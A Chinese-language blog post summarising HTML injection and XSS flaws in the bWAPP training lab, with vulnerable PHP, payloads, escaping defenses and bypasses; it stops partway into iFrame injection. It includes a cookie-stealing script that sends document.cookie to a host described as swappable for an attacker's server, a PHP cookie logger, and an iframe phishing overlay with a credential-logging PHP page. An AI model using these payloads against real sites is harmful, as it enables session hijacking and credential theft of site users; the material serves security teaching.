<!DOCTYPE html>



  


<html class="theme-next pisces use-motion" lang="zh-Hans">
<head><meta name="generator" content="Hexo 3.8.0">
  <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform">
<meta http-equiv="Cache-Control" content="no-siteapp">
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">

<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">


  <link rel="apple-touch-icon" sizes="180x180" href="/images/toux.jpg?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/toux.jpg?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/toux.jpg?v=5.1.4">


  <link rel="mask-icon" href="/images/toux.jpg?v=5.1.4" color="#222">





  <meta name="keywords" content="总结,漏洞,">





  <link rel="alternate" href="/atom.xml" title="peri0d的博客" type="application/atom+xml">






<meta name="description" content="基于 bWAPP，所列举的 payload 只是典型例子 HTML Injection - Reflected (GET)产生原因1234567891011121314151617181920&amp;lt;?php  function htmli($data)  &amp;#123;      return $data;  &amp;#125;  if(isset($_GET[&amp;quot;firstname&amp;quot;">
<meta name="keywords" content="总结,漏洞">
<meta property="og:type" content="article">
<meta property="og:title" content="常见漏洞总结">
<meta property="og:url" content="http://yoursite.com/2019/06/14/漏洞总结/index.html">
<meta property="og:site_name" content="peri0d的博客">
<meta property="og:description" content="基于 bWAPP，所列举的 payload 只是典型例子 HTML Injection - Reflected (GET)产生原因1234567891011121314151617181920&amp;lt;?php  function htmli($data)  &amp;#123;      return $data;  &amp;#125;  if(isset($_GET[&amp;quot;firstname&amp;quot;">
<meta property="og:locale" content="zh-Hans">
<meta property="og:image" content="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/bwapp/html_1.png">
<meta property="og:image" content="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/bwapp/html_2.png">
<meta property="og:image" content="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/bwapp/html_3.png">
<meta property="og:image" content="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/bwapp/html_4.png">
<meta property="og:image" content="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/bwapp/html_5.png">
<meta property="og:image" content="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/bwapp/html_6.png">
<meta property="og:image" content="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/bwapp/html_7.png">
<meta property="og:image" content="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/bwapp/html_8.png">
<meta property="og:updated_time" content="2019-07-08T04:44:11.114Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="常见漏洞总结">
<meta name="twitter:description" content="基于 bWAPP，所列举的 payload 只是典型例子 HTML Injection - Reflected (GET)产生原因1234567891011121314151617181920&amp;lt;?php  function htmli($data)  &amp;#123;      return $data;  &amp;#125;  if(isset($_GET[&amp;quot;firstname&amp;quot;">
<meta name="twitter:image" content="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/bwapp/html_1.png">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Pisces',
    version: '5.1.4',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: '博主'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://yoursite.com/2019/06/14/漏洞总结/">





  <title>常见漏洞总结 | peri0d的博客</title>
  








</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">

  
  
    
  

  <div class="container sidebar-position-left page-post-detail">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/" class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">peri0d的博客</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle">peri0d</p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
            
            首页
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
            
            标签
          </a>
        </li>
      
        
        <li class="menu-item menu-item-categories">
          <a href="/categories/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
            
            分类
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
            
            归档
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            

  <div id="posts" class="posts-expand">
    

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/06/14/漏洞总结/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="peri0d">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/toux.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="peri0d的博客">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">常见漏洞总结</h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-06-14T21:59:48+08:00">
                2019-06-14
              </time>
            

            

            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/总结/" itemprop="url" rel="index">
                    <span itemprop="name">总结</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        <p>基于 bWAPP，所列举的 payload 只是典型例子</p>
<h1 id="HTML-Injection-Reflected-GET"><a href="#HTML-Injection-Reflected-GET" class="headerlink" title="HTML Injection - Reflected (GET)"></a>HTML Injection - Reflected (GET)</h1><h2 id="产生原因"><a href="#产生原因" class="headerlink" title="产生原因"></a>产生原因</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">  function htmli($data)</span><br><span class="line">  &#123;</span><br><span class="line">      return $data;</span><br><span class="line">  &#125;</span><br><span class="line">  if(isset($_GET[&quot;firstname&quot;]) &amp;&amp; isset($_GET[&quot;lastname&quot;]))</span><br><span class="line">  &#123;   </span><br><span class="line">      $firstname = $_GET[&quot;firstname&quot;];</span><br><span class="line">      $lastname = $_GET[&quot;lastname&quot;];    </span><br><span class="line">      if($firstname == &quot;&quot; or $lastname == &quot;&quot;)</span><br><span class="line">      &#123;</span><br><span class="line">          echo &quot;&lt;font color=\&quot;red\&quot;&gt;Please enter both fields...&lt;/font&gt;&quot;   </span><br><span class="line"></span><br><span class="line">      &#125;</span><br><span class="line">      else            </span><br><span class="line">      &#123; </span><br><span class="line">          echo &quot;Welcome &quot; . htmli($firstname) . &quot; &quot; . htmli($lastname);   </span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>以 GET 方式提交数据。将提交的数据通过 URL 中，但是并<strong>未对输入进行过滤</strong></p>
<p>如果输入 <code>?firstname=1&amp;lastname=&lt;script&gt;alert(1)&lt;/script&gt;</code> </p>
<p>后面的输出就变为 <code>Welcome 1 &lt;script&gt;alert(1)&lt;/script&gt;</code>，浏览器会自动解析 JS 语句，从而弹窗</p>
<h2 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h2><p>常是诱使用户点击包含恶意代码的 URL，常用于<strong>窃取 cookies</strong> 或者进行<strong>钓鱼欺骗</strong>。</p>
<h3 id="窃取-Cookies"><a href="#窃取-Cookies" class="headerlink" title="窃取 Cookies"></a>窃取 Cookies</h3><p>payload ：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//192.168.233.1/htmli_get.php?firstname=&lt;script&gt;var x=new Image();x.src="http://192.168.233.1/test.php?cookie="+document.cookie;&lt;/script&gt;</span></span><br></pre></td></tr></table></figure>

<p>其中，192.168.233.1 可以替换为攻击者的服务器，test.php 为接受 cookies 的文件，这样就可以获取点击者的 cookies</p>
<p>test.php ( 用于接收 cookie )</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$cookie = $_GET[<span class="string">'cookie'</span>];</span><br><span class="line">$log = fopen(<span class="string">'cookie.txt'</span>,<span class="string">'a'</span>);</span><br><span class="line">fwrite($log, $cookie);</span><br><span class="line">fwrite(<span class="string">"\n"</span>);</span><br><span class="line">fclose($log);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>效果</p>
<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/bwapp/html_1.png" alt></p>
<h3 id="钓鱼"><a href="#钓鱼" class="headerlink" title="钓鱼"></a>钓鱼</h3><p>payload ：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//192.168.233.1/htmli_get.php?firstname=</span></span><br><span class="line">&lt;script&gt;</span><br><span class="line"><span class="built_in">document</span>.body.innerHTML=(</span><br><span class="line"><span class="string">'&lt;div style="position:absolute;top:0px;left:0px;width:100%;high:100%;"&gt;'</span>+</span><br><span class="line"><span class="string">'&lt;iframe src=http://192.168.233.1/fish.html width=100% height=100%&gt;'</span>+</span><br><span class="line"><span class="string">'&lt;/iframe&gt;&lt;/div&gt;'</span></span><br><span class="line">);</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>

<p>创建一个 Iframe 框架覆盖原页面，强制输入，其中，192.168.233.1 可以替换为攻击者的服务器，fish.html 为钓鱼页面，fish.php 接收数据</p>
<p>fish.html ( 钓鱼页面，直接从真实页面复制 )</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">"post"</span> <span class="attr">action</span>=<span class="string">"fish.php"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"username"</span> <span class="attr">value</span>=<span class="string">"Nick"</span> /&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"password"</span> <span class="attr">name</span>=<span class="string">"password"</span> <span class="attr">value</span>=<span class="string">"Pass"</span> /&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">name</span>=<span class="string">"login"</span> <span class="attr">value</span>=<span class="string">"submit"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>fish.php ( 接收传递的数据 )</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$data = fopen(<span class="string">"loginfile.txt"</span>,<span class="string">"a+"</span>);</span><br><span class="line">$login = $_POST[<span class="string">'username'</span>];</span><br><span class="line">$pass = $_POST[<span class="string">'password'</span>];</span><br><span class="line">fwrite($data, <span class="string">"Username: $login"</span>);</span><br><span class="line">fwrite(<span class="string">"\n"</span>);</span><br><span class="line">fwrite($data, <span class="string">"Password: $pass"</span>);</span><br><span class="line">fwrite(<span class="string">"\n"</span>);</span><br><span class="line">fclose($data);</span><br><span class="line"><span class="comment">//重定向 URL</span></span><br><span class="line">Header(<span class="string">"location: http://192.168.233.133/bWAPP/htmli_get.php"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>效果</p>
<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/bwapp/html_2.png" alt></p>
<h2 id="防护方式"><a href="#防护方式" class="headerlink" title="防护方式"></a>防护方式</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">htmli</span><span class="params">($data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $input = str_replace(<span class="string">"&lt;"</span>, <span class="string">"&amp;lt;"</span>, $data);</span><br><span class="line">    $input = str_replace(<span class="string">"&gt;"</span>, <span class="string">"&amp;gt;"</span>, $input);</span><br><span class="line"></span><br><span class="line">    $input = urldecode($input);</span><br><span class="line">    <span class="keyword">return</span> $input;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>将 <code>&lt;</code> 和 <code>&gt;</code> 替换为 HTML 实体，然后进行 URL 解码</p>
<p>绕过：</p>
<p>直接将传入的参数进行 URL 编码即可。如果是在对话框中输入，只需要一次 URL Encode，如果是在 URL 栏中输入需要两次。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">htmli</span><span class="params">($data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// htmlentities - converts all applicable characters to HTML entities</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> htmlentities($data, ENT_QUOTES);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>将所有字符替换为 HTML 实体，当需要将一个字符串输出到 Web 网页时，又不确定其中是否存在 XSS 字符时，可以使用 <strong>htmlentities</strong> 函数进行输出过滤。暂时无法绕过。</p>
<h1 id="HTML-Injection-Reflected-POST"><a href="#HTML-Injection-Reflected-POST" class="headerlink" title="HTML Injection - Reflected (POST)"></a>HTML Injection - Reflected (POST)</h1><h2 id="产生原因-1"><a href="#产生原因-1" class="headerlink" title="产生原因"></a>产生原因</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">htmli</span><span class="params">($data)</span></span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> $data;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">"firstname"</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">"lastname"</span>]))</span><br><span class="line">  &#123;   </span><br><span class="line">      $firstname = $_POST[<span class="string">"firstname"</span>];</span><br><span class="line">      $lastname = $_POST[<span class="string">"lastname"</span>];    </span><br><span class="line">      <span class="keyword">if</span>($firstname == <span class="string">""</span> <span class="keyword">or</span> $lastname == <span class="string">""</span>)</span><br><span class="line">      &#123;</span><br><span class="line">          <span class="keyword">echo</span> <span class="string">"&lt;font color=\"red\"&gt;Please enter both fields...&lt;/font&gt;"</span>   </span><br><span class="line"></span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span>            </span><br><span class="line">      &#123; </span><br><span class="line">          <span class="keyword">echo</span> <span class="string">"Welcome "</span> . htmli($firstname) . <span class="string">" "</span> . htmli($lastname);   </span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>以 POST 方式提交数据，和 GET 型类似，只是提交数据的方式不同</p>
<h2 id="利用方式-1"><a href="#利用方式-1" class="headerlink" title="利用方式"></a>利用方式</h2><p>payload (post) : </p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">firstname=<span class="number">1</span>&amp;lastname=<span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="built_in">document</span>.cookie)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure>

<p>获取登陆用户的 cookie</p>
<h2 id="防护方式-1"><a href="#防护方式-1" class="headerlink" title="防护方式"></a>防护方式</h2><p>与 GET 的防护相同，绕过方法也类似，第一种绕过需要对提交的数据 URL Encode 两次，第二种无法绕过</p>
<h1 id="HTML-Injection-Reflected-Current-URL"><a href="#HTML-Injection-Reflected-Current-URL" class="headerlink" title="HTML Injection - Reflected (Current URL)"></a>HTML Injection - Reflected (Current URL)</h1><h2 id="产生原因-2"><a href="#产生原因-2" class="headerlink" title="产生原因"></a>产生原因</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  $url = <span class="string">"http://"</span> . $_SERVER[<span class="string">"HTTP_HOST"</span>] . $_SERVER[<span class="string">"REQUEST_URI"</span>]; </span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;p align=\"left\"&gt;Your current URL: &lt;i&gt;"</span> . $url . <span class="string">"&lt;/i&gt;&lt;/p&gt;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>输出当前请求的 URL，同样，未对输入进行过滤。</p>
<h2 id="利用方式-2"><a href="#利用方式-2" class="headerlink" title="利用方式"></a>利用方式</h2><p>页面直接返回所请求的 URL，直接修改所请求的 URL。但是浏览器会自动进行 URL 编码，所以需要在 burp 中去掉 URL 编码</p>
<p>payload ：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="built_in">document</span>.cookie)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure>

<h2 id="防护方式-2"><a href="#防护方式-2" class="headerlink" title="防护方式"></a>防护方式</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$url = <span class="string">"&lt;script&gt;document.write(document.URL)&lt;/script&gt;"</span>;</span><br></pre></td></tr></table></figure>

<p>直接使用 JS 的函数输出 URL，暂时无法绕过</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">check</span><span class="params">($data, $encoding = <span class="string">"UTF-8"</span>)</span></span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> htmlspecialchars($data, ENT_QUOTES, $encoding);</span><br><span class="line">  &#125;</span><br><span class="line">  $url = <span class="string">"http://"</span>.$_SERVER[<span class="string">"HTTP_HOST"</span>].check($_SERVER[<span class="string">"REQUEST_URI"</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>使用 htmlspecialchars 进行转义，无法绕过</p>
<h1 id="HTML-Injection-Stored-Blog"><a href="#HTML-Injection-Stored-Blog" class="headerlink" title="HTML Injection - Stored (Blog)"></a>HTML Injection - Stored (Blog)</h1><h2 id="产生原因-3"><a href="#产生原因-3" class="headerlink" title="产生原因"></a>产生原因</h2><p>存储型 XSS，恶意脚本被存储到客户端或者服务器的数据库中，当其他用户浏览网页时，就在受害者主机上执行恶意代码。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">htmli</span><span class="params">($data)</span></span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> $data;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">"entry_add"</span>]))</span><br><span class="line">  &#123;</span><br><span class="line">      $entry = htmli($_POST[<span class="string">"entry"</span>]);</span><br><span class="line">      $owner = $_SESSION[<span class="string">"login"</span>];</span><br><span class="line">      <span class="keyword">if</span>($entry == <span class="string">""</span>)</span><br><span class="line">      &#123;</span><br><span class="line">          $message =  <span class="string">"&lt;font color=\"red\"&gt;Please enter some text...&lt;/font&gt;"</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span>            </span><br><span class="line">      &#123; </span><br><span class="line">          $sql = <span class="string">"INSERT INTO blog (date, entry, owner) VALUES (now(),'"</span>.$entry.<span class="string">"','"</span>.$owner.<span class="string">"')"</span>;</span><br><span class="line">          $recordset = $link-&gt;query($sql);</span><br><span class="line">          <span class="keyword">if</span>(!$recordset)</span><br><span class="line">          &#123;</span><br><span class="line">              <span class="keyword">die</span>(<span class="string">"Error: "</span> . $link-&gt;error . <span class="string">"&lt;br /&gt;&lt;br /&gt;"</span>);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="comment">// Debugging</span></span><br><span class="line">          <span class="comment">// echo $sql;</span></span><br><span class="line">          $message = <span class="string">"&lt;font color=\"green\"&gt;Your entry was added to our blog!&lt;/font&gt;"</span>;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>这里没有对输入的 entry 进行过滤，如果输入 <code>&lt;script&gt;alert(1)&lt;/script&gt;</code> ，那么这段代码就会保存在数据库，用户每次访问时都会弹窗。</p>
<h2 id="利用方式-3"><a href="#利用方式-3" class="headerlink" title="利用方式"></a>利用方式</h2><p>最典型的例子就是 XSS 蠕虫。</p>
<p>payload : </p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">//实现网页的无限刷新</span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"refresh"</span> <span class="attr">content</span>=<span class="string">"0"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">//弹出 1，注意不是 '1'</span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">"alert('1');"</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">//生成一个按钮，点击弹出 1</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">value</span>=<span class="string">"click me"</span> <span class="attr">onclick</span>=<span class="string">"alert('1')"</span>; /&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="防护方式-3"><a href="#防护方式-3" class="headerlink" title="防护方式"></a>防护方式</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">htmli</span><span class="params">($data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> addslashes($data);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>使用 addslashes 函数转义，这个函数对 <strong>单引号( ‘ )，双引号( “ )，反斜杠( \ )，NULL</strong> 生效</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">htmli</span><span class="params">($data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// htmlentities - converts all applicable characters to HTML entities</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> htmlentities($data);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>使用 htmlspecialchars 进行转义，无法绕过</p>
<h1 id="iFrame-Injection"><a href="#iFrame-Injection" class="headerlink" title="iFrame Injection"></a>iFrame Injection</h1><h2 id="产生原因-4"><a href="#产生原因-4" class="headerlink" title="产生原因"></a>产生原因</h2><p>iframe 标签是 HTML 中一个很重要的标签，常用于嵌入第三方网页，比如嵌入广告页面，第三方 Web 游戏与应用等。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">&lt;?php</span><br><span class="line">  function xss($data)&#123;</span><br><span class="line">	  return $data;</span><br><span class="line">  &#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;iframe frameborder=&quot;0&quot; src=&quot;&lt;?php echo xss($_GET[&quot;ParamUrl&quot;])?&gt;&quot; height=&quot;&lt;?php echo xss($_GET[&quot;ParamHeight&quot;])?&gt;&quot; width=&quot;&lt;?php echo xss($_GET[&quot;ParamWidth&quot;])?&gt;&quot;&gt;&lt;/iframe&gt;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>传入参数 ParamUrl，ParamHeight，ParamWidth，用于控制 iframe 组件，但是没有对传入的参数进行过滤</p>
